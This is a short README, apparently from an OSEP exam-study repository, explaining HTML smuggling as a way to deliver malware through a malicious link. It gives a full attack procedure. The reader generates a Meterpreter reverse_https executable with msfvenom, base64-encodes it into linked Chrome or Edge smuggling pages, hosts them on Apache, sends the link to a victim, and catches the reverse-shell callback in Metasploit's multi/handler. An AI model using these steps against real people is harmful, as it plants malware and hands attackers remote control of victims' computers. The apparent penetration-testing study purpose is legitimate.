### HTMLSmuggling Presentation

HTML Smuggling is one of the Client-Side attacks that consist on trick someone to clik on a malicious link that redirects to a malicious web that download on his computer malware.

In this part of the repository we can find several HTML files that lead to the download of the client's browser of malicious code via JavaScript code.

The use of this files is as follows:

- Open a HTTP server, for example:

    ```bash
    sudo service apache2 start
    ```

- Create a Base64 Meterpreter executable:

    ```bash
    sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT> -f exe -o /var/www/html/msfstaged.exe

    base64 /var/www/html/msfstaged.exe
    ```

- Copy the Base64 payload onto the HTML file ([Chrome](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/HTMLSmuggling/HTMLSmuggling-Chrome.html) if the client is using Google Chrome or [Edge](https://github.com/qv1ntv5/OSEP/blob/main/ClientSideAttacks/HTMLSmuggling/HTMLSmuggling-Edge.html) if the client is using Microsoft Edge).

- Place the HTML file in the root directory of the HTTP server (var/www/html)

- Deliver the link.

- Make use of the multi/handler module of Metasploit Framework to catch the callback.